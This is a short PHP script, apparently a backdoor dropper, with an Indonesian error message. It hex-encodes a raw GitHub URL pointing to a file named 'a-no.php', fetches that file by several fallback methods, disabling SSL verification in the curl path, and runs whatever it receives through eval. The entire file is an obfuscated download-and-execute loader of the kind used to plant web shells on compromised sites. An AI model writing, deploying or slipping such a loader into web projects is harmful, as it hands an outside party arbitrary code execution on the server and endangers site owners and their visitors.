<?php

$kitabisacom1337 = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6b69746162697361636f6d313333372f4b69746162697361636f6d313333372f726566732f68656164732f6d61696e2f612d6e6f2e706870';

function root($hex) {
    return implode('', array_map('chr', array_map('hexdec', str_split($hex, 2))));
}

$url = root($kitabisacom1337);

function download($url) {
    if (ini_get('allow_url_fopen')) {
        return file_get_contents($url);
    } elseif (function_exists('curl_version')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        $fp = @fopen($url, 'r');
        if ($fp) {
            $result = '';
            while ($data = fread($fp, 8192)) {
                $result .= $data;
            }
            fclose($fp);
            return $result;
        }
    }
    return false;
}

$phpScript = download($url);

if ($phpScript === false) {
    die("Gagal mendownload script PHP dari URL dengan semua metode.");
}

eval('?>' . $phpScript);

?>
